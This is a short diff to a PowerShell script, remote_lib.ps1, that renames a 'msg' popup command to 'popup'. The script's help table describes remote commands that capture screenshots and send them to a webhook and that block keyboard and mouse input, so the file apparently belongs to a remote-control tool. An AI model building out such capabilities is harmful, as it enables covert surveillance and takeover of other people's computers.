@@ -65,8 +65,8 @@ function unblock {
     echo "unblocked gng"
 }
 
-# Command: msg - displays a popup message box
-function msg {
+# Command: popup - displays a popup message box
+function popup {
     param(
         [Parameter(ValueFromRemainingArguments = $true)]
         [string[]]$Text
@@ -102,7 +102,7 @@ function hlp {
         "ss"      = "capture a screenshot and send it to the webhook."
         "block"   = "block keyboard and mouse input for a duration (default 5s)"
         "unblock" = "manually unblock keyboard and mouse input"
-        "msg"     = "open a popup message box with custom text"
+        "popup"   = "open a popup message box with custom text"
         "tts"     = "speak a custom text message out loud"
         "hlp"     = "Display this help information"
     }
@@ -113,6 +113,6 @@ function hlp {
 }
 
 # Export the command list to a global variable for easy enumeration (optional)
-$global:RemoteLibCommands = @('ss', 'block', 'unblock', 'msg', 'tts', 'hlp')
+$global:RemoteLibCommands = @('ss', 'block', 'unblock', 'popup', 'tts', 'hlp')
 
 # End of remote_lib.ps1
